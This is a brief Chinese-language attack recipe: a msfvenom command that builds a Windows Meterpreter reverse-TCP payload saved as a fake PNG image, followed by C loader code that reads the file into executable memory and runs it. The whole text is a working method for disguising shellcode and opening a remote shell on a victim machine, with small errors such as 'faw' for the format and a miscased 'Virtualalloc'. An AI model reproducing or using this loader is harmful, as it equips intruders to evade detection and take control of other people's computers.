	msf生成图片格式
	>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f faw -o /root/1.png
	生成解决方案即可。
	#define _CRT_SECURE_NO_WARNINGS
	#include<Windows.h> 
	#include<stdlib.h> 
	#include<stdio.h> 
	int main(void)
	{
		FILE* fp; 
		size_t size;
		unsigned char* buffer;
		fp = fopen("1.png","rb"); 
		fseek(fp,0,SEEK_END);
		size =ftell(fp); 
		fseek(fp, 0, SEEK_SET);
		buffer =(unsigned char*)malloc(size); 
		fread(buffer, size, 1, fp);
		void* exec = Virtualalloc(0, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE); 
		memcpy(exec, buffer, size);
		((void(*)()) exec)(); 
		return 0;
	}
